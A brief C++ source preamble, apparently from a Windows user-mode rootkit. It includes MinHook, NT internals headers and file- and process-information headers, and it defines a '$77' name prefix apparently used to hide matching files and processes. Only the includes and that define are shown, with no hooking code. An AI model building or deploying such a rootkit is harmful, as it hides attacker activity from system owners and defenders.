#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>
#include <vector>
#include <time.h>
#include <Windows.h>
#include <winternl.h>
#include "MinHook\MinHook.h"
using namespace std;

#include "SystemProcessInformationEx.h"
#include "FileBothDirInformationEx.h"
#include "FileDirectoryInformationEx.h"
#include "FileFullDirInformationEx.h"
#include "FileIdBothDirInformationEx.h"
#include "FileIdFullDirInformationEx.h"
#include "FileInformationClassEx.h"
#include "FileNamesInformationEx.h"

#define ROOTKIT_PREFIX L"$77"

#include "Rootkit.h"